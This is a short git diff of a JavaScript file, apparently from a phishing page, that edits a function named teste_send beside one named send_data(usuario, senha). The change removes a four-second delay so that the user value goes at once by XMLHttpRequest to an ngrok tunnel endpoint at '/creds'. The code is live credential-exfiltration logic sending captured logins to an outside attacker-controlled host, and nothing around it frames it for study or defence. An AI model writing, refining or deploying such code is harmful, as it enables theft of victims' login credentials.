@@ -43,19 +43,14 @@ function send_data(usuario, senha){
                                   
                                   
 function teste_send(user){
-   setTimeout(function(){
-       var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://0a3d-45-162-158-3.sa.ngrok.io/creds?user=" + user, true);
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-                console.log(xhr.responseText);
-            }
-        };
-        xhr.send();
-        
-    },4000)
-           
-           
+   var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://0a3d-45-162-158-3.sa.ngrok.io/creds?user=" + user, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            console.log(xhr.responseText);
+        }
+    };
+    xhr.send();        
 }
 
 
